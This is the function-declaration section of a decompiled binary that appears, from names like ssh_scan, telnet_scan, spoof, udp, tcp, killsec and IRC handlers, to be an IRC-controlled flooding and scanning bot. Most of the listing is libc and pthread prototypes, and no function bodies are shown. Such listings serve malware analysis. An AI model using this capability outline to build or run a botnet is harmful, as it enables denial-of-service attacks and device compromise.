/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2016 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

int init_proc();
void _get_pc_thunk_bx();
int _do_global_dtors_aux();
int frame_dummy();
int __cdecl strwildmatch(_BYTE *a1, unsigned __int8 *a2);
unsigned int Send(int fd, const char *a2, ...);
int __cdecl host2ip(int a1, int a2);
// signed int __usercall mfork@<eax>(int edi0@<edi>, int a1);
char __cdecl filter(const char *a1);
// char *__usercall makestring@<eax>(int a1@<edi>);
int identd();
double __cdecl pow(double x);
int __cdecl in_cksum(_BYTE *a1, signed int a2);
int getspoof();
_BOOL4 __cdecl getHost(int a1, _DWORD *a2);
// signed int __usercall std@<eax>(int edi0@<edi>, int a1, int a2, signed int a3, int *a4);
// signed int __usercall udp@<eax>(int edi0@<edi>, int a1, int a2, signed int a3, int *a4);
// signed int __usercall unk@<eax>(int edi0@<edi>, int a1, int a2, signed int a3, int a4);
int __cdecl csum(unsigned __int16 *a1, signed int a2);
int rand_cmwc();
unsigned __int32 __cdecl getRandomIP(int a1);
// int __usercall tcpcsum@<eax>(int edi0@<edi>, int a1, _DWORD *a2);
int __cdecl makeIPPacket(int a1, int a2, int a3, char a4, __int16 a5);
int __cdecl fdgets(int a1, int a2, int fd);
int getOurIP();
void __cdecl tcp(int a1, int a2, signed int a3, _DWORD *a4);
void ssh_scan();
void telnet_scan();
unsigned int __cdecl killsec(int a1, char *a2);
int __cdecl stop(int a1, int a2);
unsigned int __cdecl spoof(int a1, int a2, int a3, int a4);
unsigned int __cdecl getspoofs(int a1, int a2);
void __cdecl move(int fd, int a2, int a3, int a4);
char __cdecl PRIVMSG(int a1, const char *a2, const char *a3);
unsigned int __cdecl 376(int a1);
unsigned int __cdecl PING(int a1, int a2, int a3);
int *__cdecl 352(int a1, int a2, const char *a3);
// char *__usercall 433@<eax>(int a1@<edi>);
int con();
int __cdecl main(int argc, const char **argv, const char **envp);
void **thread_self();
void *_h_errno_location();
void *_errno_location();
void __cdecl _pthread_manager_adjust_prio(signed int a1);
_DWORD *_pthread_manager_sighandler();
// void **__usercall pthread_kill_all_threads@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall __noreturn pthread_start_thread(off_t a1@<ebp>, int a2);
// void __usercall __noreturn pthread_start_thread_event(off_t a1@<ebp>, int a2);
// int __usercall pthread_free@<eax>(int a1@<eax>, unsigned int a2@<ebp>);
// unsigned int __usercall restart@<eax>(int a1@<eax>);
// signed int __usercall pthread_reap_children@<eax>(unsigned int a1@<ebp>);
void __cdecl _pthread_manager(int fd);
_DWORD *__cdecl _pthread_manager_event(int fd);
// _DWORD *__usercall pthread_insert_list@<eax>(_DWORD *result@<eax>, int a2@<edx>, _DWORD *a3@<ecx>, int a4);
// __int64 __usercall pthread_call_handlers@<edx:eax>(int a1@<eax>);
signed int fork();
// signed int __usercall pthread_atfork@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5);
// int *__usercall enqueue@<eax>(int *result@<eax>, int a2@<edx>);
// signed int __usercall remove_from_queue@<eax>(int *a1@<eax>, int a2@<edx>);
int __cdecl sem_getvalue(int a1, _DWORD *a2);
// int __usercall _pthread_set_own_extricate_if@<eax>(int a1@<eax>, int a2@<edx>);
signed int sem_unlink();
signed int sem_close();
int sem_open();
signed int __cdecl sem_destroy(int a1);
signed int __cdecl sem_trywait(int a1);
signed int __cdecl sem_init(_DWORD *a1, int a2, int a3);
void **thread_self_0();
int __cdecl new_sem_extricate_func(int a1, int a2);
// int __usercall suspend@<eax>(int a1@<eax>);
signed int __cdecl sem_timedwait(int a1, _DWORD *a2);
// int __usercall sem_wait@<eax>(off_t a1@<ebp>, int a2);
// signed int __usercall sem_post@<eax>(unsigned __int32 ebp0@<ebp>, int a2@<edi>, int a1);
int pthread_null_sighandler(); // weak
void **thread_self_1();
void **__cdecl pthread_sighandler_rt(void *a1, int a2, int a3);
void **__cdecl pthread_sighandler(void *a1, char a2);
signed int __cdecl sigaction(int a1, char *a2, _DWORD *a3);
// int __usercall sigwait@<eax>(off_t a1@<ebp>, int a2, _DWORD *a3);
int __cdecl pthread_kill(int, int sig); // idb
int __cdecl raise(int sig); // idb
int __cdecl pthread_sigmask(unsigned int a1, char *a2);
// int __usercall wait_node_dequeue@<eax>(volatile signed __int32 *a1@<eax>, volatile signed __int32 *a2@<edx>, signed __int32 *a3@<ecx>);
// signed __int32 __usercall _pthread_acquire@<eax>(volatile signed __int32 *a1@<eax>, off_t a2@<ebp>);
// int __usercall wait_node_free@<eax>(_DWORD *a1@<eax>, off_t a2@<ebp>);
// unsigned int __usercall restart_0@<eax>(int a1@<eax>);
unsigned int __cdecl _pthread_alt_unlock(volatile signed __int32 *a1);
void **thread_self_2();
// int __usercall suspend_0@<eax>(int a1@<eax>);
int __cdecl _pthread_alt_lock(volatile signed __int32 *a1, void **a2);
// unsigned int __usercall _pthread_lock@<eax>(volatile signed __int32 *a1@<eax>, int a2@<edx>);
int __cdecl _pthread_unlock(volatile signed __int32 *a1);
signed int __cdecl _pthread_alt_timedlock(volatile signed __int32 *a1, void **a2, _DWORD *a3);
// signed int __usercall sendto@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7);
// signed int __usercall sendmsg@<eax>(off_t a1@<ebp>, int a2, int a3, int a4);
// signed int __usercall send@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5);
// signed int __usercall recvmsg@<eax>(off_t a1@<ebp>, int a2, int a3, int a4);
// signed int __usercall recvfrom@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7);
// signed int __usercall recv@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5);
// signed int __usercall connect@<eax>(off_t a1@<ebp>, int a2, int a3, int a4);
// signed int __usercall accept@<eax>(off_t a1@<ebp>, int a2, int a3, int a4);
// unsigned int __usercall write@<eax>(off_t a1@<ebp>, int fd, void *addr, size_t len);
// unsigned int __usercall waitpid@<eax>(off_t a1@<ebp>, pid_t pid, int *status, int options);
// unsigned int __usercall wait@<eax>(off_t a1@<ebp>, int *status);
// unsigned int __usercall tcdrain@<eax>(off_t a1@<ebp>, int d);
// int __usercall system@<eax>(off_t a1@<ebp>, int a2);
// unsigned int __usercall read@<eax>(off_t a1@<ebp>, int fd, void *addr, size_t len);
// unsigned int __usercall pwrite@<eax>(off_t a1@<ebp>, off_t offset, void *addr, size_t len, off_t a5);
// unsigned int __usercall pread64@<eax>(off_t a1@<ebp>, int a2, void *addr, size_t len, int a5, int a6);
// unsigned int __usercall pread@<eax>(off_t a1@<ebp>, off_t offset, void *addr, size_t len, off_t a5);
// signed int __usercall pause@<eax>(off_t a1@<ebp>);
// unsigned int __usercall open64@<eax>(off_t a1@<ebp>, char *filename, int a3, int a4);
// unsigned int __usercall open@<eax>(off_t a1@<ebp>, char *filename, int flags, int a4);
// unsigned int __usercall nanosleep@<eax>(off_t ebp0@<ebp>, int a1, struct timespec *rem);
// unsigned int __usercall msync@<eax>(off_t a1@<ebp>, void *addr, size_t length, int flags);
// int __usercall lseek64@<eax>(off_t a1@<ebp>, int fd, unsigned __int32 offset_low, unsigned __int32 offset_high, unsigned int whence);
// unsigned int __usercall lseek@<eax>(off_t a1@<ebp>, int fd, off_t offset, int whence);
// unsigned int __usercall fsync@<eax>(off_t a1@<ebp>, int fd);
// unsigned int __usercall fcntl@<eax>(off_t a1@<ebp>, int fd, int cmd, struct flock *lock);
// unsigned int __usercall close@<eax>(off_t a1@<ebp>, int fd);
int _libc_current_sigrtmin();
int _libc_current_sigrtmax();
int __cdecl _libc_allocate_rtsig(int a1);
_BOOL4 __cdecl pthread_equal(int a1, int a2);
int __cdecl pthread_setconcurrency(int a1);
int pthread_getconcurrency();
// signed int __usercall _pthread_timedsuspend_new@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, int a5, _DWORD *a6);
unsigned int __cdecl _pthread_restart_new(int a1);
int __cdecl _pthread_wait_for_restart_signal(int a1);
// int __usercall suspend_1@<eax>(int a1@<eax>);
unsigned int _pthread_find_self();
void **thread_self_3();
// void __usercall pthread_onexit_process(off_t a1@<ebp>, int a2);
void *pthread_self();
// signed int __usercall _pthread_reset_main_thread@<eax>(unsigned int a1@<ebp>);
// signed int __usercall pthread_kill_other_threads_np@<eax>(unsigned __int32 a1@<ebp>);
int pthread_initialize(void); // weak
// signed int __usercall _pthread_initialize_manager@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>);
// signed int __usercall pthread_create@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, _DWORD *a3, int a4, int a5, int a6);
// _DWORD *__usercall pthread_handle_sigcancel@<eax>(off_t a1@<ebp>);
struct __jmp_buf_tag *__cdecl pthread_handle_sigrestart(void *a1);
void *_pthread_initialize_minimal();
int __cdecl pthread_setschedparam(int, int policy, struct sched_param *p); // idb
int __cdecl pthread_getschedparam(int, int, struct sched_param *p); // idb
int pthread_attr_destroy();
signed int __cdecl pthread_attr_setdetachstate(unsigned int *a1, unsigned int a2);
int __cdecl pthread_attr_getdetachstate(_DWORD *a1, _DWORD *a2);
signed int __cdecl pthread_attr_setschedpolicy(int a1, unsigned int a2);
int __cdecl pthread_attr_getschedpolicy(int a1, _DWORD *a2);
signed int __cdecl pthread_attr_setinheritsched(int a1, unsigned int a2);
int __cdecl pthread_attr_getinheritsched(int a1, _DWORD *a2);
signed int __cdecl pthread_attr_setscope(int a1, int a2);
int __cdecl pthread_attr_getscope(int a1, _DWORD *a2);
int __cdecl pthread_attr_getguardsize(int a1, _DWORD *a2);
int __cdecl pthread_attr_setstackaddr(int a1, int a2);
int __cdecl pthread_attr_getstackaddr(int a1, _DWORD *a2);
signed int __cdecl pthread_attr_setstacksize(int a1, unsigned int a2);
int __cdecl pthread_attr_getstacksize(int a1, _DWORD *a2);
int __cdecl pthread_attr_init(_DWORD *a1);
char __cdecl pthread_attr_setguardsize(int a1, int a2);
int __cdecl pthread_attr_getschedparam(int a1, char *a2);
signed int __cdecl pthread_attr_setschedparam(int a1, char *a2);
void **thread_self_4();
// int __usercall _pthread_perform_cleanup@<eax>(off_t a1@<ebp>, unsigned int a2);
__int64 __cdecl pthread_cleanup_push_defer(_DWORD *a1, int a2, int a3);
void **__cdecl pthread_cleanup_pop(int a1, int a2);
__int64 __cdecl pthread_cleanup_push(_DWORD *a1, int a2, int a3);
// int __usercall pthread_cleanup_pop_restore@<eax>(off_t ebp0@<ebp>, int a1, int a2);
// void **__usercall pthread_testcancel@<eax>(off_t a1@<ebp>);
// signed int __usercall pthread_setcanceltype@<eax>(off_t a1@<ebp>, unsigned int a2, _DWORD *a3);
// signed int __usercall pthread_setcancelstate@<eax>(off_t a1@<ebp>, unsigned int a2, _DWORD *a3);
signed int __cdecl pthread_cancel(int a1);
// int *__usercall enqueue_0@<eax>(int *result@<eax>, int a2@<edx>);
// signed int __usercall remove_from_queue_0@<eax>(int *a1@<eax>, int a2@<edx>);
int __cdecl pthread_cond_init(_DWORD *a1);
int __cdecl pthread_cond_destroy(int a1);
int pthread_condattr_init();
int pthread_condattr_destroy();
int __cdecl pthread_condattr_getpshared(int a1, _DWORD *a2);
int __cdecl pthread_condattr_setpshared(int a1, unsigned int a2);
// int __usercall _pthread_set_own_extricate_if_0@<eax>(int a1@<eax>, int a2@<edx>);
// unsigned int __usercall restart_1@<eax>(int a1@<eax>);
int __cdecl pthread_cond_broadcast(int a1);
void **thread_self_5();
signed int __cdecl cond_extricate_func(int a1, int a2);
// int __usercall suspend_2@<eax>(int a1@<eax>);
signed int __cdecl pthread_cond_timedwait(int a1, off_t a2, _DWORD *a3);
signed int __cdecl pthread_cond_wait(int a1, int a2);
int __cdecl pthread_cond_signal(int a1);
int _linuxthreads_create_event(void); // weak
int _linuxthreads_death_event(void); // weak
int _linuxthreads_reap_event(void); // weak
// int __usercall _pthread_set_own_extricate_if_1@<eax>(int a1@<eax>, int a2@<edx>);
void **thread_self_6();
_BOOL4 __cdecl join_extricate_func(int a1);
// int __usercall suspend_3@<eax>(int a1@<eax>);
// void __usercall __noreturn _pthread_do_exit(off_t a1@<ebp>, void *a2, unsigned int a3);
// void __usercall __noreturn pthread_exit(off_t a1@<ebp>, void *a2);
signed int __cdecl pthread_join(off_t a1, _DWORD *a2);
signed int __cdecl pthread_detach(int a1);
int _fresetlockfiles();
// signed int __usercall _pthread_trylock@<eax>(volatile signed __int32 *a1@<eax>);
// signed int __usercall _pthread_alt_trylock@<eax>(volatile signed __int32 *a1@<eax>);
int __cdecl pthread_mutex_init(_DWORD *a1, signed int *a2);
signed int __cdecl pthread_mutex_destroy(int a1);
int __cdecl pthread_mutexattr_init(_DWORD *a1);
int pthread_mutexattr_destroy();
signed int __cdecl pthread_mutexattr_settype(unsigned int *a1, unsigned int a2);
int __cdecl pthread_mutexattr_gettype(_DWORD *a1, _DWORD *a2);
int __cdecl pthread_mutexattr_getpshared(int a1, _DWORD *a2);
int __cdecl pthread_mutexattr_setpshared(int a1, unsigned int a2);
int _pthread_once_fork_child();
void **thread_self_7();
signed int __cdecl pthread_mutex_unlock(int a1);
signed int _pthread_once_fork_parent();
signed int __cdecl pthread_mutex_trylock(int a1);
signed int __cdecl pthread_mutex_timedlock(int a1, _DWORD *a2);
signed int __cdecl pthread_mutex_lock(int a1);
signed int _pthread_once_fork_prepare();
int __cdecl pthread_once(int *a1, void (__fastcall *a2)(int, _DWORD));
int __cdecl pthread_once_cancelhandler(_DWORD *a1);
// void *__usercall pthread_cleanup_upto@<eax>(int a1@<eax>);
void __cdecl __noreturn longjmp(struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) env, int val);
void __cdecl __noreturn siglongjmp(struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) env, int val);
void **thread_self_8();
void **__cdecl _pthread_internal_tsd_address(int a1);
void *__cdecl _pthread_internal_tsd_get(int a1);
int __cdecl _pthread_internal_tsd_set(int a1, void *a2);
int __cdecl pthread_getspecific(unsigned int a1);
int _pthread_destroy_specifics();
// signed int __usercall pthread_setspecific@<eax>(off_t a1@<ebp>, unsigned int a2, int a3);
signed int __cdecl pthread_key_delete(unsigned int a1);
signed int __cdecl pthread_key_create(signed int *a1, int a2);
signed int __cdecl _libc_sigaction(int a1, int a2, int a3);
int __cdecl clone(int, int, int flags, int, int *parent_tidptr, struct user_desc *newtls, int *child_pidptr); // idb
// int __usercall _sigsetjmp@<eax>(int ebx0@<ebx>, int ebp0@<ebp>, int a3@<edi>, int a4@<esi>, int a1, int a2);
// int __usercall mmap@<eax>(size_t a1@<ecx>, int a2@<ebx>, off_t a3@<ebp>, int a4@<edi>, int a5@<esi>, char start);
unsigned int __cdecl _libc_fcntl(int fd, int cmd, struct flock *lock);
unsigned int __cdecl fcntl64(int fd, int cmd);
signed int _syscall_rt_sigaction();
void exit(int status);
unsigned int __cdecl _libc_close(int fd);
signed int _libc_fork();
unsigned int __cdecl _libc_fsync(int fd);
int __cdecl getcwd(int, size_t len); // idb
signed int geteuid();
signed int getpagesize();
signed int getpid();
signed int getppid();
signed int getrlimit();
unsigned int __cdecl gettimeofday(int a1, struct timezone *tz);
unsigned int __cdecl ioctl(int d, int request);
unsigned int __cdecl kill(int a1, int sig);
loff_t __cdecl _libc_lseek64(int fd, unsigned __int32 offset_low, unsigned __int32 offset_high, unsigned int whence);
void longjmp(struct __jmp_buf_tag env[1], int val);
unsigned int __cdecl _libc_lseek(int fd, off_t offset, int whence);
unsigned int __cdecl _libc_msync(void *addr, size_t length, int flags);
unsigned int __cdecl munmap(int a1, int len);
unsigned int __cdecl _libc_nanosleep(int a1, struct timespec *rem);
unsigned int __cdecl _libc_open(char *filename, int flags, int a3);
unsigned int __cdecl creat(char *filename, int a2);
unsigned int __cdecl _libc_open64(char *filename, int a2, int a3);
signed int _libc_pause();
unsigned int __cdecl pipe(int *filedes);
unsigned int __cdecl poll(struct pollfds *ufds, unsigned int nfds, int timeout);
// unsigned int __usercall _fake_pread_write64@<eax>(size_t len@<ecx>, void *addr@<edx>, int a3@<eax>, int a4, int a5, int a6);
unsigned int __cdecl pwrite64(int a1, void *addr, size_t len, int a4, int a5);
unsigned int __cdecl _libc_pread64(int a1, void *addr, size_t len, int a4, int a5);
// unsigned int __usercall _fake_pread_write@<eax>(size_t len@<ecx>, void *addr@<edx>, int a3@<eax>, off_t offset, int a5);
unsigned int __cdecl _libc_pwrite(off_t offset, void *addr, size_t len, off_t a4);
unsigned int __cdecl _libc_pread(off_t offset, void *addr, size_t len, off_t a4);
unsigned int __cdecl _libc_read(int fd, void *addr, size_t len);
unsigned int __cdecl sched_get_priority_max(int policy);
unsigned int __cdecl sched_get_priority_min(int policy);
unsigned int __cdecl sched_getparam(int a1, struct sched_param *p);
unsigned int __cdecl sched_getscheduler(pid_t pid);
unsigned int __cdecl sched_setscheduler(pid_t pid, int policy, const struct sched_param *p);
signed int sched_yield();
unsigned int __cdecl select(int n, fd_set *readfds, fd_set *writefds, fd_set *except_fds, struct timeval *timeout);
unsigned int __cdecl setrlimit(int a1, const struct rlimit *rlim);
signed int __cdecl sigprocmask(unsigned int a1, int a2);
signed int sigsuspend();
unsigned int __cdecl time(time_t *time_0);
unsigned int __cdecl _libc_wait(int *status);
unsigned int __cdecl wait4(pid_t pid, int *status, int options, struct rusage *rusage);
unsigned int __cdecl _libc_waitpid(pid_t pid, int *status, int options);
unsigned int __cdecl _libc_write(int fd, const void *addr, size_t len);
int __cdecl toupper(int a1);
signed int __cdecl fclose(int a1);
int __cdecl fopen(char *filename, int a2);
int __cdecl vsprintf(int a1, void *a2, int a3);
int sprintf(int a1, const char *a2, ...);
int __cdecl vsnprintf(int a1, unsigned int a2, void *a3, int a4);
int __cdecl stdio_fopen(char *filename, int, int, int fd); // idb
_BOOL4 stdio_init();
char *__cdecl _stdio_init_mutex(char *a1);
int stdio_term();
int __cdecl _stdio_wcommit(int a1);
// int __usercall charpad@<eax>(size_t a1@<eax>, char a2@<dl>, int a3@<ecx>);
int __cdecl fp_out_narrow(size_t len, int, void *addr, void *); // idb
int __cdecl vfprintf_internal(size_t len, void *, int); // idb
signed int __cdecl ppfs_init(_DWORD *a1, _BYTE *a2);
int __cdecl ppfs_prepargs(_DWORD *a1, int a2);
int __cdecl ppfs_setargs(int a1);
// int __usercall promoted_size@<eax>(int a1@<eax>);
int __cdecl ppfs_parsespec(int a1);
// int __usercall feof@<eax>(off_t a1@<ebp>, int *a2);
// char *__usercall fgets@<eax>(off_t a1@<ebp>, char *a2, int a3, unsigned int *a4);
// signed int __usercall fputs@<eax>(off_t ebp0@<ebp>, char *a1, size_t a2);
// int __usercall stdio_openlist_dec_use@<eax>(unsigned __int32 a1@<ebp>);
signed int __cdecl fflush_unlocked(int a1);
char *__cdecl fgets_unlocked(char *a1, int a2, unsigned int *a3);
signed int __cdecl fputs_unlocked(char *a1, size_t len);
size_t __cdecl fwrite_unlocked(void *a1, int a2, int a3, size_t len);
char *__cdecl memcpy(char *a1, char *a2, unsigned int a3);
void *__cdecl memset(void *a1, char a2, unsigned int a3);
const char *__cdecl strcat(const char *a1, char *a2);
_BYTE *__cdecl strcpy(_BYTE *a1, char *a2);
unsigned int __cdecl strlen(const char *a1);
_BYTE *__cdecl strncpy(_BYTE *a1, char *a2, int a3);
int __cdecl strnlen(_BYTE *a1, int a2);
unsigned __int8 *__cdecl strstr(unsigned __int8 *a1, unsigned __int8 *a2);
char *__cdecl _glibc_strerror_r(unsigned int a1, char *a2, unsigned int a3);
signed int __cdecl strerror_r(unsigned int a1, char *a2, unsigned int a3);
char *__cdecl bcopy(char *a1, char *a2, unsigned int a3);
int __cdecl strcasecmp(unsigned __int8 *a1, unsigned __int8 *a2);
// char *__usercall strdup@<eax>(off_t a1@<ebp>, char *a2);
char *__cdecl strtok(char *a1, _BYTE *a2);
_BOOL4 __cdecl isatty(int d);
unsigned int __cdecl _libc_tcdrain(int d);
unsigned int __cdecl tcgetattr(int d, int a2);
int __cdecl htons(__int16 a1);
unsigned __int32 __cdecl htonl(unsigned int a1);
int __cdecl ntohs(__int16 a1);
unsigned __int32 __cdecl ntohl(unsigned int a1);
signed int __cdecl inet_network(unsigned __int8 *a1);
signed int __cdecl inet_addr(char *a1);
int __cdecl gethostbyname(unsigned __int8 *a1);
signed int __cdecl gethostbyname_r(unsigned __int8 *a1, _DWORD *a2, int a3, unsigned int a4, _DWORD *a5, int *a6);
signed int __cdecl _libc_accept(int a1, int a2, int a3);
signed int __cdecl bind(int a1, int a2, int a3);
signed int __cdecl _libc_connect(int a1, int a2, int a3);
signed int __cdecl getsockname(int a1, int a2, int a3);
signed int __cdecl listen(int a1, int a2);
signed int __cdecl _libc_recv(int a1, int a2, int a3, int a4);
signed int __cdecl _libc_recvfrom(int a1, int a2, int a3, int a4, int a5, int a6);
signed int __cdecl _libc_recvmsg(int a1, int a2, int a3);
signed int __cdecl _libc_send(int a1, int a2, int a3, int a4);
signed int __cdecl _libc_sendmsg(int a1, int a2, int a3);
signed int __cdecl _libc_sendto(int a1, int a2, int a3, int a4, int a5, int a6);
signed int __cdecl setsockopt(int a1, int a2, int a3, int a4, int a5);
signed int __cdecl socket(int a1, int a2, int a3);
int __cdecl sigaddset(int a1, int a2);
int __cdecl sigdelset(int a1, int a2);
int __cdecl sigemptyset(void *a1);
int __cdecl sigfillset(void *a1);
signed int __cdecl sigismember(int a1, int a2);
int __cdecl _sigjmp_save(int a1, int a2);
_BOOL4 __cdecl _sigismember(int a1, int a2);
int __cdecl _sigaddset(int a1, int a2);
int __cdecl _sigdelset(int a1, int a2);
// int __usercall _malloc_largebin_index@<eax>(unsigned int a1@<eax>);
// int __usercall malloc@<eax>(off_t a1@<ebp>, int a2@<edi>, unsigned int a3);
// _DWORD *__usercall calloc@<eax>(off_t a1@<ebp>, int a2@<edi>, unsigned int a3, int a4);
// int __usercall realloc@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, char *a3, unsigned int a4);
// signed int __usercall _malloc_trim@<eax>(int a1@<eax>, int a2@<edx>);
int __cdecl _malloc_consolidate(int *a1);
// void __usercall free(unsigned int ebp0@<ebp>, _DWORD *a1);
signed int __cdecl malloc_trim(int a1);
void __noreturn abort();
int rand(void); // weak
// int __usercall random@<eax>(off_t a1@<ebp>);
// int __usercall setstate@<eax>(off_t a1@<ebp>, _DWORD *a2);
// int __usercall initstate@<eax>(off_t a1@<ebp>, signed int a2, _DWORD *a3, unsigned int a4);
// int __usercall srandom@<eax>(off_t a1@<ebp>, signed int a2);
signed int __cdecl setstate_r(_DWORD *a1, _DWORD *a2);
int __cdecl random_r(int a1, _DWORD *a2);
signed int __cdecl srandom_r(signed int a1, _DWORD *a2);
signed int __cdecl initstate_r(signed int a1, _DWORD *a2, unsigned int a3, _DWORD *a4);
int __cdecl _libc_system(int a1);
unsigned int __cdecl atol(_BYTE *a1);
unsigned int __cdecl strtol(_BYTE *a1, _DWORD *a2, int a3);
unsigned int __cdecl stdlib_strto_l(_BYTE *a1, _DWORD *a2, int a3, int a4);
// void __usercall __noreturn exit(off_t a1@<ebp>, int status);
// signed int __usercall on_exit@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, int a3, int a4);
unsigned int __cdecl execl(char *file, int a2, char a3);
// __time_t __usercall sleep@<eax>(off_t a1@<ebp>, __time_t a2);
signed int __cdecl sysconf(int a1);
void *_libc_pthread_init();
int _uClibc_fini();
int _pthread_return_0();
// int __usercall _check_one_fd@<eax>(int a1@<eax>, int a2@<edx>);
_BOOL4 (*_uClibc_init())();
void __cdecl __noreturn _uClibc_main(int (__cdecl *a1)(int, char ***, char **, _DWORD *), int a2, char ***a3, void (*a4)(void), int (*a5)(void), int (*a6)(void), int a7);
int (__cdecl *rpc_thread_multi())(int a1, void *a2);
// _DWORD *__usercall _rpc_thread_variables@<eax>(off_t a1@<ebp>, int a2@<edi>);
// void *__usercall _rpc_thread_svc_max_pollfd@<eax>(off_t a1@<ebp>, int a2@<edi>);
// void *__usercall _rpc_thread_svc_pollfd@<eax>(off_t a1@<ebp>, int a2@<edi>);
// void *__usercall _rpc_thread_createerr@<eax>(off_t a1@<ebp>, int a2@<edi>);
// void *__usercall _rpc_thread_svc_fdset@<eax>(off_t a1@<ebp>, int a2@<edi>);
// __int64 __usercall _rpc_thread_destroy@<edx:eax>(off_t a1@<ebp>, int a2@<edi>);
signed int _syscall_error();
void _longjmp(struct __jmp_buf_tag env[1], int val);
int _vfork(void); // weak
signed int _socketcall();
signed int clock_getres();
unsigned int __cdecl execve(const char *file, const char **argv, const char **envp);
signed int getdtablesize();
signed int getegid();
signed int getgid();
signed int getuid();
unsigned int __cdecl mremap(void *old_address, size_t old_size, size_t new_size, unsigned __int32 flags);
int __cdecl sbrk(int a1);
void *_GI___h_errno_location();
int __cdecl wcrtomb(char *a1, int a2);
int __cdecl wcsrtombs(char *a1, char *a2, unsigned int a3);
int __cdecl wcsnrtombs(char *a1, char *a2, unsigned int a3, unsigned int a4);
size_t __cdecl _stdio_WRITE(int a1, void *addr, size_t len);
size_t __cdecl _stdio_fwrite(void *a1, void *addr, size_t len);
signed int __cdecl _stdio_trans2w_o(unsigned int *a1, int a2);
__int64 __cdecl load_inttype(int a1, int a2, int a3);
__int64 __cdecl store_inttype(_BYTE *a1, int a2, __int64 a3);
_BYTE *__cdecl uintmaxtostr(_BYTE *a1, __int64 a2, signed int a3, char a4);
int __cdecl fpmaxtostr(int a1, long double a2, int a3, int a4);
signed int __cdecl getc_unlocked(unsigned int *a1);
int __cdecl memchr(_BYTE *a1, char a2, int a3);
char *__cdecl memmove(char *a1, char *a2, unsigned int a3);
int __cdecl mempcpy(char *a1, char *a2, unsigned int a3);
int __cdecl memrchr(int a1, unsigned __int8 a2, unsigned int a3);
char *__cdecl strtok_r(char *a1, _BYTE *a2, char **a3);
_BYTE *__cdecl strpbrk(_BYTE *a1, _BYTE *a2);
// __int64 __usercall _rpc_thread_clnt_cleanup@<edx:eax>(off_t a1@<ebp>, int a2@<edi>);
// int __usercall callrpc@<eax>(int a1@<edi>, unsigned __int8 *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
char *__cdecl clntudp_geterr(int a1, char *a2);
int __cdecl clntudp_freeres(int a1, int (__cdecl *a2)(_DWORD *, int), int a3);
signed int __cdecl clntudp_control(int a1, int a2, char *a3);
// char **__usercall clntudp_bufcreate@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5, int a6, int a7, int *a8, int a9, int a10);
// char **__usercall clntudp_create@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5, int a6, int a7, int *a8);
// void __usercall clntudp_destroy(unsigned int a1@<ebp>, _DWORD *a2);
// signed int __usercall clntudp_call@<eax>(char *a1@<edi>, _DWORD *a2, char a3, int (__cdecl *a4)(_DWORD *, int, int, int), int a5, int a6, int a7, int a8, int a9);
// int __usercall create_xid@<eax>(off_t a1@<ebp>);
// int __usercall pmap_getport@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5);
// int __usercall xdr_pmap@<eax>(int a1@<eax>, int a2, _DWORD *a3);
int __cdecl seterr_reply(_DWORD *a1, int *a2);
// int __usercall xdr_callhdr@<eax>(int eax0@<eax>, _DWORD *a1, int a2);
int __cdecl xdr_rejected_reply(int a1, _DWORD *a2);
// int __usercall xdr_replymsg@<eax>(int a1@<eax>, int a2, _DWORD *a3);
int __cdecl xdr_des_block(int a1, int a2);
int __cdecl xdr_opaque_auth(int a1, int a2);
int __cdecl xdr_accepted_reply(int a1, _DWORD *a2);
int __cdecl svc_sendreply(int a1, int a2, int a3);
int __cdecl svcerr_noproc(int a1);
int __cdecl svcerr_decode(int a1);
int __cdecl svcerr_systemerr(int a1);
int __cdecl svcerr_auth(int a1, int a2);
int __cdecl svcerr_weakauth(int a1);
int __cdecl svcerr_noprog(int a1);
int __cdecl svcerr_progvers(int a1, int a2, int a3);
// int __usercall svc_find@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>, off_t a4@<ebp>);
// int __usercall svc_getreq_common@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3);
int __cdecl svc_getreqset(int *a1);
int __cdecl svc_getreq(int a1);
int *__cdecl svc_unregister(off_t a1, int a2);
// int __usercall _rpc_thread_svc_cleanup@<eax>(off_t a1@<ebp>, int a2@<edi>);
int __cdecl svc_register(int a1, int a2, int a3, off_t a4, int a5);
// _DWORD *__usercall xprt_unregister@<eax>(off_t a1@<ebp>, int a2@<edi>, signed int *a3);
_DWORD *__cdecl svc_getreq_poll(int a1, off_t a2);
// int __usercall xprt_register@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, int *a3);
signed int __cdecl authenticate(int a1, int a2);
int __cdecl xdr_free(int (__cdecl *a1)(int *, int), int a2);
signed int xdr_void();
int __cdecl xdr_long(int *a1);
// int __usercall xdr_short@<eax>(int a1@<eax>, int *a2, _WORD *a3);
int __cdecl xdr_int(_DWORD, _DWORD); // weak
// int __usercall xdr_u_long@<eax>(int a1@<eax>, int a2, _DWORD *a3);
int __cdecl xdr_u_int(_DWORD, _DWORD); // weak
_BOOL4 __cdecl xdr_hyper(int *a1, int *a2);
// _BOOL4 __usercall xdr_u_hyper@<eax>(int a1@<edx>, int a2@<ecx>, int *a3, int *a4);
int __cdecl xdr_u_short(int a1, _WORD *a2);
int __cdecl xdr_char(int a1, _BYTE *a2);
int __cdecl xdr_u_char(int a1, _BYTE *a2);
// int __usercall xdr_bool@<eax>(int a1@<eax>, int a2, _DWORD *a3);
